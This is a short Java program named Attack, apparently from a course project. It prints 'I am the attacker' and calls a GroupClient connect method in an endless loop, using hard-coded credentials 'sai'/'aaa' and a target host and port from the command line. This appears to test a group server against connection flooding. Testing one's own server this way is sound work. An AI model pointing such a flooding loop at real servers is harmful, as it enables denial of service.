import java.util.*;
import java.io.*;
import java.security.*;
import javax.crypto.*;

public class Attack{

	public static void main(String[] args)
	{
		System.out.println("I am the attacker"); 
		GroupClient gc = new GroupClient(); 
		while(true)
		{
			try{
				gc.connect(args[0], Integer.parseInt(args[1]), "sai", "aaa", "localhost", 4321); 
			}
			catch(Exception e){
				System.out.println(e); 
				System.exit(0); 
			}
		}
		
	}
}

